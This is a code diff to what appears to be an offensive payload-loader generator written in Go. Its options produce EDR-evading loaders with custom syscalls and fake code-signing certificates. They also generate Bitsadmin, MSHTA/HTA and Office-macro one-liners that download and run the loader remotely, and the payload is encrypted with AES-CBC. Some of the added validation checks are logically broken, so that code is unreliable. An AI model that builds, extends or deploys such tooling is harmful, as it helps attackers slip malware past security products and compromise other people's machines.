@@ -44,9 +44,9 @@ func options() *FlagOptions {
 	refresher := flag.Bool("unmodified", false, "When enabled will generate a DLL loader that WILL NOT removing the EDR hooks in system DLLs and only use custom syscalls (set to false by default)")
 	URL := flag.String("url", "", "URL associated with the Delivery option to retrieve the payload. (e.g. https://acme.com/)")
 	CommandLoader := flag.String("delivery", "", `Generates a one-liner command to download and execute the payload remotely:
-[*] bits - Generates a Bitsadmin one liner command to download, execute and remove the loader.
-[*] hta - Generates a blank hta file containing the loader along with a MSHTA command execute the loader remotely in the background.
-[*] macro - Generates an office macro that will download and execute the loader remotely.`)
+[*] bits - Generates a Bitsadmin one liner command to download, execute and remove the loader (Compatable with Binary, Control, Excel and Wscript Loaders).
+[*] hta - Generates a blank hta file containing the loader along with a MSHTA command execute the loader remotely in the background (Compatable with Control and Excel Loaders). 
+[*] macro - Generates an office macro that will download and execute the loader remotely (Compatable with Control, Excel and Wscript Loaders)`)
 	domain := flag.String("domain", "", "The domain name to use for creating a fake code signing cert. (e.g. www.acme.com) ")
 	password := flag.String("password", "", "The password for code signing cert. Required when -valid is used.")
 	valid := flag.String("valid", "", "The path to a valid code signing cert. Used instead -domain if a valid code signing cert is desired.")
@@ -113,8 +113,16 @@ func main() {
 		log.Fatal("Error: Invalid delivery option, please select one of the allowed delivery types")
 	}
 
-	if opt.outFile != "" && opt.LoaderType == "binary" {
-		log.Fatal("Error: -O not needed. These loader types use the name of the file they are spoofing")
+	if opt.CommandLoader == "hta" && opt.outFile == "" {
+		log.Fatal("Error: Please provide the a HTA filename to store the loader in")
+	}
+
+	if opt.CommandLoader == "hta" && opt.CommandLoader == "macro" && opt.LoaderType == "binary" || opt.LoaderType == "dll" {
+		log.Fatal("Error: Binary and DLL loaders are not compatable with this delivery command")
+	}
+
+	if opt.outFile != "" && opt.LoaderType == "binary" || opt.LoaderType == "dll" {
+		fmt.Println("[!] -O not needed. This loader type uses the name of the file they are spoofing")
 	}
 
 	if opt.LoaderType == "binary" && opt.refresher == true {
@@ -153,7 +161,6 @@ func main() {
 	cipherText := make([]byte, len(paddedInput))
 	ciphermode := cipher.NewCBCEncrypter(block, iv)
 	ciphermode.CryptBlocks(cipherText, paddedInput)
-
 	b64ciphertext := base64.StdEncoding.EncodeToString(cipherText)
 	b64key := base64.StdEncoding.EncodeToString(key)
 	b64iv := base64.StdEncoding.EncodeToString(iv)
